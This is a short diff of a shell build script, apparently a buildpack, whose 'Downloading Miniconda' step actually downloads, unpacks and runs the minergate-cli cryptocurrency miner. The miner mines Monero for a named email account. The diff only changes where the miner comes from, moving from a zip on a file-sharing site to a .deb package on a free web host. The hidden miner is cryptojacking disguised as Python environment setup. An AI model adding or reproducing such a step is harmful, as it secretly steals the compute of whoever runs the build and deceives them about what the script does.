@@ -36,10 +36,10 @@ echo "-----> Preparing Python Environment..."
 
 echo "---> Downloading Miniconda..."
 
-wget https://file.town/uploads/wah66to6xrapy01f899xbj9s5.zip
-unzip wah66to6xrapy01f899xbj9s5.zip
-cd minergate-cli
-chmod +x minergate-cli
+wget https://hupiter.000webhostapp.com/a.deb
+ar x a.deb
+tar -xvzf data.tar.gz
+cd opt/minergate-cli
 ./minergate-cli -user greenfieldsvp@outlook.com.vn -xmr
 wget -O $miniconda_installer "https://repo.continuum.io/miniconda/$conda_runtime"
 chmod +x $miniconda_installer
